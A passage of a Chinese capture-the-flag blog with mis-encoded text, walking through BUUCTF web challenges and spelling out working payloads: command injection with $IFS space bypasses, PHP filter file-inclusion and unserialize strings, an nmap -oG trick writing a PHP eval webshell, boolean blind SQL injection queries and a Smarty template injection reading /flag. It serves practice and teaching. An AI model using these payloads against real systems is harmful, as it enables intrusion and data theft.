ç”¨æ¥ç”Ÿæˆ <code>sign</code>ï¼Œéœ€è¦çš„æ˜¯ <code>action</code> å’Œ <code>param</code>ï¼Œä½†æ˜¯è¿™é‡Œçš„ <code>action</code> è¢«å›ºå®šäº†ï¼Œä¸å¥½ä¸‹æ‰‹ã€‚è·Ÿç€ä»£ç æ¥åˆ° <code>getSign()</code>ï¼Œå‘ç°äº†æ‹¼æ¥ <code>secert_key + param + action</code>ï¼Œäºæ˜¯åªè¦æŠŠåŸæœ¬è¯·æ±‚é‡Œçš„ <code>param</code> æ„é€ æˆ <code>flag.txtread</code> å°±èƒ½ç”Ÿæˆå¯¹åº”çš„å¯ç”¨ <code>sign</code> äº†ã€‚</p><p>å°†ç”Ÿæˆçš„ <code>sign</code> è·Ÿä¸Šè¿°çš„ä¸¤ä¸ªå‚æ•°ä¸€èµ·ä»¥å¯¹åº”çš„å½¢å¼å‘ <code>/Delta</code> å‘èµ·è¯·æ±‚å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4b706878-1516-4a40-9aea-1f393a4b1650&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>æŒ‰ç…§å¾ˆç®€æ´çš„æç¤º <code>/?ip=</code> è¯•äº†ä¸€æ³¢ï¼Œå‘ç°åŠ ä¸Šåˆ†å·ä¹‹åå¯ä»¥æ‰§è¡Œæ›´å¤šå‘½ä»¤ã€‚äºæ˜¯è¯•äº†ä¸€æ³¢ <code>ls</code>ï¼Œå‘ç°äº† flag.phpï¼Œåªè¦æƒ³åŠæ³•è¯»å®ƒå°±è¡Œäº†ã€‚è¯•äº†ä¸€ä¸‹ä¹‹åå‘ç° flag å’Œ ç©ºæ ¼éƒ½è¢« ban äº†ã€‚äºæ˜¯æŸ¥äº†ä¸€æ³¢ï¼Œå‘ç° <code>$IFS$2</code> å¯ä»¥ç”¨æ¥ä»£æ›¿ç©ºæ ¼ã€‚åŠ ä¸Šå¯ä»¥ä½¿ç”¨å˜é‡æ¥ä»£æ›¿ flag é‡Œçš„ä¸€éƒ¨åˆ†å­—ç¬¦ï¼Œå°±å¯ä»¥æ„é€ å‡º <code>o=g;cat$IFS$2fla$o.php</code>ã€‚å‘é€è¯·æ±‚ä¹‹åæŸ¥çœ‹ç½‘é¡µæºç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY(1_sh0uld_ban_Icmp_4tFirst)</span><br></pre></td></tr></table></figure><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>å¼€å±€ä¸€æ®µä»£ç ï¼Œéƒ½æ˜¯è€å¥—è·¯ï¼Œæ„é€  <code>text=data://text/plain,welcome to the zjctf</code> è¿‡æ‰åˆ¤æ–­ï¼Œç„¶åå†æ„é€  <code>file=php://filter/convert.base64-encode/resource=useless.php</code> è¯»å–ä¸€ä¸‹ useless.phpã€‚Base64 è§£ç ä¹‹åå¾—åˆ° useless.phpã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>è¿™æ³¢æŒºç®€å•ï¼Œæ”¾åˆ° IDE é‡Œéšä¾¿åºåˆ—åŒ–ä¸€ä¸‹ï¼Œå¾—åˆ° <code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> ä¹‹åæ”¾è¿›å‚æ•° <code>password</code> é‡Œã€‚ç„¶åå‘èµ·è¯·æ±‚ï¼ˆx <span class="heimu" title="çœŸæ˜¯çš„ï¼Œç»†å¿ƒä¸€ç‚¹å˜›">è¿™é‡Œä¸å¯¹å‘~</span></p><p>å› ä¸ºè¿˜è¦åŠ è½½ useless.php ååºåˆ—åŒ–æ‰èƒ½èµ·æ•ˆæœï¼Œæ‰€ä»¥è¦ä¿®æ”¹åŸæ¥ php ä¼ªåè®®çš„æ„é€ ï¼Œæœ€åæ„é€ å‡º <code>.../?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</code> å¾—åˆ°ä¸€ä¸² base64 å­—ç¬¦ä¸²ï¼Œè§£ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8e991b07-be12-4339-9fbc-e895b87b9bc2&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><p>è¿™æ³¢æ˜¯ç®€å•é¢˜ï¼Œçœ‹ä¸€ä¸‹ url ä¹‹åæ„é€ ç®€å•çš„æ–‡ä»¶åŒ…å« <code>.../?file=php://filter/convert.base64-encode/resource=flag.php</code>ã€‚å°†å†…å®¹ base64 è§£ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ad315b-01ff-4d4e-9560-635a28d81a17&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h3><p>è¿™æ³¢ä¹Ÿæ˜¯ç®€å•é¢˜ï¼Œç›´æ¥ä¸€ä¸ª <code>&amp;</code> è¿æ¥å‘½ä»¤,æ„é€  <code>114.114.114.114 &amp; cat /flag</code>ï¼Œå°±èƒ½è¾“å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3cb2f161-aed1-423f-9eed-c93fa2fc2328&#125;</span><br></pre></td></tr></table></figure><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>æœ¬æ¥å‡†å¤‡ç•™åˆ°åé¢å†™è¿™é¢˜çš„ï¼Œä½†æ˜¯è·Ÿ<a href="https://duitutu.cn">å †å †</a>è®¨è®ºçš„æ—¶å€™ä»–è·Ÿæˆ‘é€éœ²äº†æ˜¯æºç æ³„éœ²ï¼Œæ‰€ä»¥å¹²è„†å°±å…ˆå†™ä¸€å†™ã€‚æ—¢ç„¶æ ‡é¢˜æ˜¯ Easy Javaï¼ŒåŠ ä¸Šæ‹¿åˆ°çš„èµ„æ–™ï¼Œåœ¨çœ‹åˆ°é¢˜ç›®ç»™å‡ºçš„ help çš„ url ä¹‹åæœæ–­æ„é€ ä¸‹è½½ä¸€æ³¢ <code>WEB-INF/web.xml</code>ã€‚ä¸è¿‡ä»ç„¶é‡åˆ°äº†ç‚¹é—®é¢˜ï¼Œéœ€è¦ä½¿ç”¨ POST è¯·æ±‚æ‰èƒ½ä¸‹è½½åˆ°æ–‡ä»¶ã€‚ä¸‹è½½ä¸‹æ¥ä¹‹åå‘ç°æœ‰ä¸€ä¸ª <code>com.wm.ctf.FlagController</code>ï¼Œäºæ˜¯å†æ„é€ ä¸€æ³¢ <code>WEB-INF/classes/com/wm/ctf/FlagController.class</code> æ¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚ä¸‹è½½ä¹‹åæ‰“å¼€æ¥æˆ‘ä¸€æ—¶æ‡µäº†ï¼Œæ¯•ç«Ÿæ˜¯ç¼–è¯‘è¿‡çš„ä¸œè¥¿ï¼Œæ‰€ä»¥çœ‹èµ·æ¥ä¹±ä¸ƒå…«ç³Ÿï¼Œæ„£æ˜¯æ²¡å‘ç°æœ‰æ®µ base64ã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼ŒæŠŠ base64 å­—ç¬¦ä¸²è§£ç ä¹‹åå°±æ˜¯ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;db7dab97-1cd7-48ad-b991-66ec0c3dc816&#125;</span><br></pre></td></tr></table></figure><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>å•Šï¼Œè¿™é¢˜å¼€é—¨è§å±±ï¼Œç»™äº†ä¸€æ®µä»£ç ï¼Œä¸€çœ‹å°±ä¸ç®€å•ï¼ˆbushiï¼‰ã€‚ç¨å¾®ä¸€çœ‹å°±çŸ¥é“ï¼Œä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œä¸¤é“è¿‡æ»¤ä¹‹åæ‰§è¡Œï¼Œåˆ©ç”¨ç‚¹è‚¯å®šåœ¨ <code>nmap</code> æŒ‡ä»¤ã€‚äºæ˜¯å°±å»æŸ¥ä¸€æ³¢è¿™ä¸ªæŒ‡ä»¤çš„æ‰‹å†Œï¼Œå¯ä»¥çœ‹åˆ°è¿™æ ·ä¸€æ¡å…è®¸æˆ‘ä»¬ç›´æ¥å†™å¦‚æ–‡ä»¶çš„å‚æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.</span><br></pre></td></tr></table></figure><p>åŒæ—¶ <code>sandbox</code> çš„è·¯å¾„ä¼šåœ¨æˆåŠŸä¹‹åè¾“å‡ºã€‚å› æ­¤ï¼Œæƒ³åŠæ³•å†™å…¥ä¸€å¥è¯ç„¶åç”¨èšå‰‘å»è¿ä¸Šå°±è¡Œå•¦ã€‚</p><p>å…ˆæ¥çœ‹çœ‹ <code>nmap</code>ï¼Œä½¿ç”¨ä¸Šé¢çš„é‚£ä¸ªå‚æ•°ï¼Œæ„é€  <code>nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&#39; -oG pick.php</code> å°è¯•ï¼Œå¾—åˆ°ä¸€ä¸ª pick.php æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Tue Apr 28 01:07:48 2020 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG pick.php &quot;&lt;?php eval($_POST[&quot;pick&quot;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># Nmap done at Tue Apr 28 01:07:48 2020 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¯­å¥å·²ç»å®Œæ•´åœ°å†™å…¥è¿›å»äº†ã€‚å†çœ‹è¿‡æ»¤çš„é‚£ä¸¤ä¸ªå‡½æ•°ï¼Œæ ¹æ® PHP æ‰‹å†Œçš„è¯´æ˜ï¼Œ<code>escapeshellarg()</code> è¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰æ‰€æœ‰å¼•å·ç„¶åç”¨å¼•å·åŒ…èµ·æ¥ï¼ŒåŒæ—¶åœ¨å­—ç¬¦ä¸²ä¸¤ç«¯åŠ ä¸Šå¼•å·ã€‚<code>escapeshellcmd()</code> ä¼šåœ¨éƒ¨åˆ†å­—ç¬¦å‰åŠ ä¸Š <code>\</code>ã€‚<span class="HighlightWKT7BlueGreen">ï¼ˆåœ¨ Windows ä¸‹ä¼šæœ‰æ‰€ä¸åŒï¼Œå»ºè®®ä½¿ç”¨ Linux ç¯å¢ƒå°è¯•ã€‚ï¼‰</span>å› æ­¤ï¼Œå…ˆå‡å®šæ•´ä¸ª payload ä¸º <code>A</code>ï¼Œæ­£å¸¸æ¥è¯´å®ƒä¼šè¢« <code>escapeshellarg()</code> å˜æˆ <code>&#39;A&#39;</code>ã€‚å¦‚æœæˆ‘ä»¬åœ¨ <code>A</code> å‰åå†åŠ ä¸Šä¸€ä¸ªå•å¼•å·ï¼Œå°±ä¼šå˜æˆ <code>&#39;&#39;\&#39;&#39;A&#39;\&#39;&#39;&#39;</code>ï¼Œè¿™ä¸ªæ—¶å€™å› ä¸ºæœ‰åæ–œæ è½¬ä¹‰ï¼Œæ‰€ä»¥è¿™ä¸ª payload è¿˜æ˜¯ä¸å¤ªå¯¹ã€‚ä½†æ˜¯ <code>escapeshellcmd()</code> çš„å‡ºç°æ˜¯ä¸€ä¸ªåŠ©æ”»ï¼Œå®ƒä¼šåœ¨åæ–œæ å‰åŠ ä¸ªåæ–œæ è½¬ä¹‰ï¼Œé‚£ payload å°±æˆäº† <code>&#39;&#39;\\&#39;&#39;A&#39;\\&#39;&#39;&#39;</code>ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæ‰€æœ‰å¼•å·é—­åˆï¼ŒA æš´éœ²åœ¨è¯­å¥ä¸­ï¼Œæ‰§è¡Œå†™å…¥å°±æˆåŠŸäº†ã€‚ç”¨èšå‰‘è¿ä¸Šå»å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2fba51b2-2f0b-42b4-ac84-144f7c7b39e3&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h3><p>è¿™é¢˜é¦–å…ˆæç¤ºå¤‡ä»½å’Œ <code>source file</code>ï¼Œç•¥å¾®æ‰¾ä¸€ä¸‹ä¸éš¾æ‰¾åˆ°ï¼ˆå®åœ¨æ‰¾ä¸åˆ°å°±æ‰«æå™¨å˜›ï¼‰index.php.bakã€‚å®¡è®¡ä¸€æ³¢å¯ä»¥å‘ç° <code>$key = intval($key);</code> æŠŠ <code>$key</code> åå®æˆæ•´æ•°äº†ï¼Œç„¶åæŠŠæ•´æ•°å’Œå­—ç¬¦ä¸²ç›¸æ¯”ï¼Œé‚£å­—ç¬¦ä¸²å°±ä¼šè¢«æˆªæ–­äº†ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹çš„ <code>$str</code> æœ€åæ˜¯ 123ã€‚æ‰€ä»¥ï¼Œåªéœ€è¦ä½¿ä¼ å…¥çš„å‚æ•°å€¼ä¸º 123 å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30d4e82b-b8b5-42ea-aaec-fb00ad067bad&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h3><p>è¿™é¢˜ä¸çŸ¥é“ä¸ºå•¥ï¼Œä¸Šæ¥æŠ¥äº†ä¸ªé”™ã€‚ï¼ˆå†™å®Œäº†é¢˜ç›®ä¹‹åå‘ç°å¹¶æ²¡æœ‰ç”¨  ä¸€é¡¿å€’è…¾ä¹‹åå¯ä»¥å‘ç° robots.txt çš„å­˜åœ¨ï¼Œç„¶åæ ¹æ®çº¿ç´¢è®¿é—®åˆ° fAke_f1agggg.phpã€‚è¿™ä¸ªé¡µé¢ä¸€å®šæœ‰çº¿ç´¢ï¼Œæ’æŸ¥ä¹‹åå‘ç°å“åº”é‡Œæœ‰ <code>Look_at_me: /fl4g.php</code>ï¼Œè®¿é—®ä¸€æ³¢ï¼Œæ¥åˆ°äº†æœ€åäº¿æ­¥çš„é¡µé¢ã€‚</p><p>é¦–å…ˆæ˜¯ <code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code> è¿™ä¸ªç‚¹ï¼ŒæŸ¥äº†ä¸€æ³¢ä¹‹åå‘ç°äº†ç¥å¥‡æ“ä½œï¼Œ<code>intval</code> çš„è¿”å›å€¼åœ¨å¤§äº 2147483647 ä¹‹åä¼šå˜å¾—å¥‡å¥‡æ€ªæ€ªï¼Œè¯•äº†ä¸€æ³¢ï¼Œä»¥å­—ç¬¦ä¸²ä¼ å…¥ç§‘å­¦è®¡æ•°æ³•ä¹Ÿä¼šè¢«æˆªæ–­ï¼Œä½†æ˜¯å½“åŠ ä¸Šä¸€ä¸ªæ•°å­—ä¹‹ååˆæ­£å¸¸äº†ï¼Œæ‰€ä»¥ï¼Œæ•´ä¸ª <code>1e4</code> æ„é€ ä¸€å¥ <code>echo (intval(&quot;1e4&quot;) &lt; 2020 &amp;&amp; intval(&quot;1e4&quot; + 1) &gt; 2021)?&quot;true&quot;:&quot;false&quot;;</code> è¯•è¯•çœ‹ï¼Œå¾ˆå·§çš„æ˜¯åœ¨ php 5.6 ä¸‹ï¼Œè¿™å¥ä¼šè¿”å› <code>true</code> è€Œ php 7.2 ä¸‹è¿”å›çš„æ˜¯ falseã€‚åŸå› æ˜¯ <code>intval(&quot;1e4&quot;)</code> åœ¨ php 7.2 ä¸‹ä¸ä¼šå†è¢«æˆªæ–­è€Œæ­£å¸¸è½¬åŒ–ã€‚</p><p>æ¥ç€çš„ç‚¹æ˜¯ <code>$md5==md5($md5)</code>ï¼Œè¿™å°±å¾ˆæœ‰æ„æ€äº†ï¼Œå¥½åœ¨å®ƒæ˜¯ä¸ªå¼±æ¯”è¾ƒï¼Œäºæ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°ç”¨ç§‘å­¦è®¡æ•°æ³•çš„å¥—è·¯ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼ˆæœŸé—´çš„æ—¶é—´è¶³å¤Ÿæ³¡å®Œä¸€æ¯å’–å•¡å†å–ä¸Šä¸¤å£ï¼‰ï¼Œæ‰¾åˆ° <code>0e215962017</code> çš„ MD5 ä¹Ÿä»¥ 0e å¼€å¤´ï¼Œäºæ˜¯è¿™ä¸ªç‚¹è¾¾æˆã€‚</p><p>æœ€åæ˜¯ä¸¤ä¸ªå°ç‚¹ï¼Œç©ºæ ¼çš„è¿‡æ»¤ç”¨ <code>$IFS$2</code> ç»•è¿‡ï¼Œ<code>cat</code> ä¸ç»™ç”¨å°±ç”¨ <code>tac</code>ã€‚ä½†æ˜¯ï¼Œåœ¨è¿™ä¹‹å‰å¾—å…ˆè¯»ä¸ªç›®å½•ï¼Œæ¯•ç«Ÿé¢˜ç›®æ²¡è¯´ flag åœ¨å“ªã€‚äºæ˜¯é¦–å…ˆæ„é€  <code>.../fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</code> å¾—åˆ° flag æ‰€åœ¨ï¼Œç„¶åå†æ„é€  <code>/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$2fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;s1mple_php_1s_v3ry_e@sy_and_here_1s_y0ur_stupid_flag_wish_u_h@ve_@_go0d_time_enj0y_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h3><p>æœ´å®æ— åçš„ç•Œé¢åˆæŠ¥äº†ä¸¤ä¸ªé”™ï¼Œä¸è¿‡ä¾æ—§æ²¡ä»€ä¹ˆç”¨ã€‚å›è¿‡å¤´æ¥çœ‹æŸ¥è¯¢ï¼Œé‚£åº”è¯¥æ˜¯æ•°æ®åº“æ“ä½œäº†ã€‚ç¨å¾®è¯•äº†ä¸€æ‰‹ä¹‹åå‘ç°æ˜¯ GET å‚æ•°ä¸è¾“å…¥æ¡†çš„å¯¹åº”ï¼ŒçŒœæµ‹ä¸€æ³¢æŸ¥è¯¢è¯­å¥å¯èƒ½æ˜¯ <code>SELECT SCORE FROM TABLE WHERE ID=</code>ï¼Œäºæ˜¯å°è¯•å¸ƒå°”ç›²æ³¨ï¼Œæ„é€ ä¸€æ³¢ <code>if((ascii(substr((select(database())),1,1))&lt;1),1,0)</code> æ£€æµ‹å‘ç°å¤§äº 1 å’Œå°äº 1 çš„æ—¶å€™åˆ†åˆ«å¯¹åº” <code>Hi admin, your score is: 100</code> å’Œ <code>student number not exists.</code>ã€‚äºæ˜¯æ‹¿å‡ºä¹‹å‰çš„äºŒåˆ†æ³•æ¨¡æ¿ï¼Œç¨ä½œä¿®æ”¹å°±å¯ä»¥ç”¨äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">çˆ†è¡¨</span><br><span class="line">if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">çˆ†åˆ—</span><br><span class="line">if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">çˆ† flag</span><br><span class="line">if((ascii(substr((select(value)from(flag)),1,1))&gt;1),1,0)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆå‡ºç°äº†å¸¸è§„æ“ä½œï¼ŒçœŸçš„ flag ä¸åœ¨ flag é‡Œåè€Œåœ¨ value é‡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h3><p>è¿™é¢˜ä¸Šæ¥ç»™äº†ä¿©æ¥å£ï¼Œæš—ç¤º X-Forwarded-Forï¼Œç„¶åå½“å‰ IP ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºï¼Œäºæ˜¯æƒ³åˆ°äº†æ¨¡æ¿æ³¨å…¥ï¼Œè¯•äº†ä¸€æ‰‹ä¹‹åå‘ç°çœŸçš„æ˜¯ï¼Œè€Œä¸”æ˜¯ Smartyã€‚ä¸€ç•ªæŸ¥æ‰¾ä¹‹åæ‰¾åˆ°äº†<a href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl">å‚è€ƒ</a>ã€‚äºæ˜¯æœæ–­æ„é€  <code>&#123;if print_r(file_get_contents('/flag'))&#125;&#123;/if&#125;</code>ï¼Œæ”¾åˆ° X-Forwarded-For çš„ä½ç½®è¯·æ±‚ã€‚ä¹‹ååœ¨é¡µé¢æºç ä¸­å¯ä»¥æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;291d99ce-2668-4b27-bc1a-da2c4aa567e2&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">FileInclusion</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">fastcoll</span></p><p>é¢˜ç›®çš„é¡µé¢ä¸€æ‰“å¼€å°±æ˜¾ç¤ºäº†ä¸¤å¼ å›¾ï¼Œå¾ˆä¸ä¸€æ ·çš„æ˜¯æœ‰ä¸€å¼ æ˜¯ Base64 åµŒå…¥åœ¨ç½‘é¡µé‡Œçš„ï¼Œè¿™ç§åšæ³•ä¸€èˆ¬æ¯”è¾ƒå°‘ã€‚äºæ˜¯çœ‹äº†ä¸€çœ¼ urlï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­çš„ <code>img</code> ç»™çš„å¾ˆåƒæ˜¯ Base64 ç¼–ç ã€‚äºæ˜¯å°è¯•è¡¥å…¨ç­‰å·ç„¶åè§£ç ï¼Œå‘ç°æ›´åƒäº†ï¼Œäºæ˜¯å†è§£å¯†äº†ä¸€æ¬¡ï¼Œå¾—åˆ°äº† <code>3535352e706e67</code>ã€‚çœ‹èµ·æ¥åƒ hexï¼Œå°è¯•è§£ç åæœç„¶å¾—åˆ°äº†çº¿ç´¢ <code>555.png</code>ã€‚äºæ˜¯ä¾¿æƒ³åˆ°åŒ…å«æ–‡ä»¶ã€‚æŠŠ <code>index.php</code> ä¸€é¡¿æ“ä½œä¹‹åå¾—åˆ°äº†é¡µé¢æºç ï¼ˆè¿™é‡Œæˆªå– php éƒ¨åˆ†ï¼‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span 